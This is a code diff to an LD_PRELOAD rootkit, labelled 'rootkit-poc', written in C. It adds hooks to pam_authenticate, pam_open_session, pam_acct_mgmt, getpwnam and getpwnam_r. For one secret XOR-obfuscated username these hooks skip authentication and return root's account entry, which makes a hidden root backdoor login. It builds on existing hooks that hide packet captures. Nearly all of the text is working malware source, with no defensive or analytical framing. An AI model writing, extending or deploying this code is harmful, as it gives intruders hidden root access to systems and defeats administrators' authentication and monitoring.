@@ -19,8 +19,10 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <pty.h>
-#include <unistd.h>
 #include <pcap/pcap.h>
+#include <security/pam_appl.h>
+#include <security/pam_modules.h>
+#include <pwd.h>
 
 #include "etc.h"
 #include "libshserver.h"
@@ -40,6 +42,10 @@ void init(void) {
         syscall_list[i].syscall_name[50] = '\0'; // null-terminated
 
         syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scallname); // gets the pointer to the original syscall function
+
+        if (!syscall_list[i].syscall_func) {
+            DEBUG("[rootkit-poc]: Error loading syscall %s\n", dlerror());
+        }
 
         cleanup(scallname, strlen(scallname)); // clears allocated memory
     }
@@ -507,5 +513,136 @@ int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
     old_pcap_callback = callback;
 
     return (long) syscall_list[SYS_PCAP_LOOP].syscall_func(p, cnt, packet_handler, user);
+}
+
+// Hooked pam_authenticate function to bypass login
+int pam_authenticate(pam_handle_t *pamh, int flags) {
+    DEBUG("[rootkit-poc]: pam_authenticate called\n");
+
+    init(); // hook configurations
+
+    void *user;
+    char *blind_login = strdup(BLIND_LOGIN);
+
+    xor(blind_login);
+
+    pam_get_item(pamh, PAM_USER, (const void **)&user);
+
+    if (strstr(user, blind_login)) {
+        cleanup(blind_login, strlen(blind_login));
+        return PAM_SUCCESS;
+    }
+
+    cleanup(blind_login, strlen(blind_login));
+
+    // Calls the original pam_authenticate function if it's not a blind login
+    return (long) syscall_list[SYS_PAM_AUTHENTICATE].syscall_func(pamh, flags);
+}
+
+// Hooked pam_open_session function to bypass login
+int pam_open_session(pam_handle_t *pamh, int flags) {
+    DEBUG("[rootkit-poc]: pam_open_session called\n");
+
+    init(); // hook configurations
+
+    void *user;
+    char *blind_login = strdup(BLIND_LOGIN);
+
+    xor(blind_login);
+
+    pam_get_item(pamh, PAM_USER, (const void **)&user);
+
+    if (strstr(user, blind_login)) {
+        cleanup(blind_login, strlen(blind_login));
+        return PAM_SUCCESS;
+    }
+
+    cleanup(blind_login, strlen(blind_login));
+
+    // Calls the original pam_open_session function if it's not a blind login
+    return (long) syscall_list[SYS_PAM_OPEN_SESSION].syscall_func(pamh, flags);
+}
+
+// Hooked getpwnam function to bypass login
+struct passwd *getpwnam(const char *name) {
+    DEBUG("[rootkit-poc]: getpwnam called %s\n", name);
+
+    init(); // hook configurations
+
+    struct passwd *mypw;
+    char *blind_login = strdup(BLIND_LOGIN);
+    char *c_root = strdup(C_ROOT);
+
+    xor(blind_login);
+    xor(c_root);
+
+    if (strstr(name, blind_login)) {
+        mypw = syscall_list[SYS_GETPWNAM].syscall_func(c_root);
+        mypw->pw_name = strdup(c_root);
+
+        cleanup(blind_login, strlen(blind_login));
+        cleanup(c_root, strlen(c_root));
+
+        return mypw;
+    }
+
+    cleanup(blind_login, strlen(blind_login));
+    cleanup(c_root, strlen(c_root));
+
+    // Calls the original getpwnam function if it's not a blind login
+    return syscall_list[SYS_GETPWNAM].syscall_func(name);
+}
+
+// Hooked getpwnam_r function to bypass login
+int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result) {
+    DEBUG("[rootkit-poc]: getpwnam_r called\n");
+
+    init(); // hook configurations
+
+    char *blind_login = strdup(BLIND_LOGIN);
+    char *c_root = strdup(C_ROOT);
+    char user[51];
+
+    xor(blind_login);
+    xor(c_root);
+
+    if (strstr(name, blind_login)) {
+        strncpy(user, c_root, sizeof(user)-1);
+
+        cleanup(blind_login, strlen(blind_login));
+        cleanup(c_root, strlen(c_root));
+
+        return (long) syscall_list[SYS_GETPWNAM_R].syscall_func(user, pwd, buf, buflen, result);
+    }
+
+    cleanup(blind_login, strlen(blind_login));
+    cleanup(c_root, strlen(c_root));
+
+    // Calls the original getpwnam_r function if it's not a blind login
+    return (long) syscall_list[SYS_GETPWNAM_R].syscall_func(name, pwd, buf, buflen, result);
+}
+
+// Hooked pam_acct_mgmt function to bypass login
+int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
+    DEBUG("[rootkit-poc]: pam_acct_mgmt called\n");
+
+    init(); // hook configurations
+
+    void *user;
+    char *blind_login = strdup(BLIND_LOGIN);
+
+    xor(blind_login);
+
+    pam_get_item(pamh, PAM_USER, (const void **)&user);
+
+    if (strstr(user, blind_login)) {
+        cleanup(blind_login, strlen(blind_login));
+        return PAM_SUCCESS;
+    }
+
+    cleanup(blind_login, strlen(blind_login));
+
+    // Calls the original pam_acct_mgmt function if it's not a blind login
+    return (long) syscall_list[SYS_PAM_ACCT_MGMT].syscall_func(pamh, flags);
 }
 
